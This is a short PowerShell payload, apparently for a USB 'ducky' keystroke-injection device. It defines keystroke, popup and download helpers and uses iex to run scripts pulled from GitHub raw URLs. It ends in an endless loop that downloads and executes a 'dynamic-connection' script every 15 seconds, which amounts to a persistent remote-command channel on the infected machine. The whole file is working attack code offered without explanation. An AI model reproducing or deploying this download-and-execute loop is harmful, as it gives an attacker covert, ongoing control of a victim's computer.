[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::Tls12
function k([string]$a){(new-object -comobject wscript.shell).sendkeys($a)}
function popup([string]$text,[int]$timeout,[string]$title){(new-object -comobject wscript.shell).popup($text,$timeout,$title)}
function ds([string]$a){(new-object net.webclient).downloadstring($a)}
function df([string]$a,[string]$b){(new-object net.webclient).downloadfile($a, $b)}
function signature{notepad;sleep 1;iex (ds http://raw.githubusercontent.com/computer-geek64/ducky/master/powershell_signatures/kali_powershell)}
iex (ds "http://raw.githubusercontent.com/computer-geek64/ducky/master/dependencies/audio.ps1")
while($true){iex (ds "http://raw.githubusercontent.com/computer-geek64/ducky/master/dynamic-connection");sleep 15}
